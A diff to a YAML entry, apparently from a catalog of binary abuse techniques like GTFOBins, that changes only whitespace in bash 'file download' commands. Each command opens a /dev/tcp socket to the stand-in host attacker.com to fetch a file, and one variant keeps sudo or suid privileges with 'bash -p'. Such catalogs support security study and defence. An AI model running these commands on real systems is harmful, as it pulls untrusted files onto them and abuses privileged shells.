@@ -5,14 +5,14 @@ functions:
     code: |-
       bash -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
           3<>/dev/tcp/attacker.com/12345 \
-          | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > /path/to/output-file'
+          | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
     contexts:
       sudo:
       suid:
         code: |-
           bash -p -c '{ echo -ne "GET /path/to/input-file HTTP/1.0\r\nhost: attacker.com\r\n\r\n" 1>&3; cat 0<&3; } \
               3<>/dev/tcp/attacker.com/12345 \
-              | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } > /path/to/output-file'
+              | { while read -r; do [ "$REPLY" = "$(echo -ne "\r")" ] && break; done; cat; } >/path/to/output-file'
       unprivileged:
     sender: http-server
   - binary: false
